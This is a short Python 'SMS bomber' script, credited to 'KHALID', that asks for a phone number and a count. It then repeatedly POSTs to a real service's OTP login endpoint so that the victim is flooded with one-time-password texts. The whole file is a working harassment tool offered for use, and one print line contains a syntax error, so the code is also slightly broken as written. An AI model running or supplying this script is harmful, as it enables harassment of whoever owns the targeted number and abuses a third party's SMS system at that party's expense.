#Clur


red="\033[0;31m"          # Red

yellow="\033[0;33m"       # Yellow

green="\033[0;32m"        # Green

color_off="\033[0m"       # Text Reset

bblack="\033[1;30m"       # Black

bred="\033[1;31m"         # Red

ured="\033[4;31m"         # Red

on_green="\033[42m"       # Green

blue="\033[0;34m"         # Blue

lightblue = '\033[94m'

red = '\033[91m'

white = '\33[97m'

yellow = '\33[93m'

green = '\033[1;32m'

cyan  = "\033[96m"

#imports

import os
import time
import sys
import requests
from requests.structures import CaseInsensitiveDict
print("\033[H\033[J")
#print(



def clr():
    os.system("clear")

def logo():
    os.system("lolcat logo.txt")


clr()
logo()
number=str(input(red+"\n\t\tEnter Your Number: "))
amount=int(input(red+"\n\t\tEnter Your Amount: "))
print("----------------------------------------------------")
url = "https://ss.binge.buzz/otp/send/login"
time.sleep(3)

headers = CaseInsensitiveDict()
headers["Content-Type"] = "application/x-www-form-urlencoded"

data = "phone="+number

for j in range(amount):
    resp = requests.post(url, headers=headers, data=data)
    print(str(j+1)+green"SMS SEND BOMBING DONE BY KHALID:)")
time.sleep(5)
print(blue+"\n\t SMS BOMBING DONE BY KHALID")
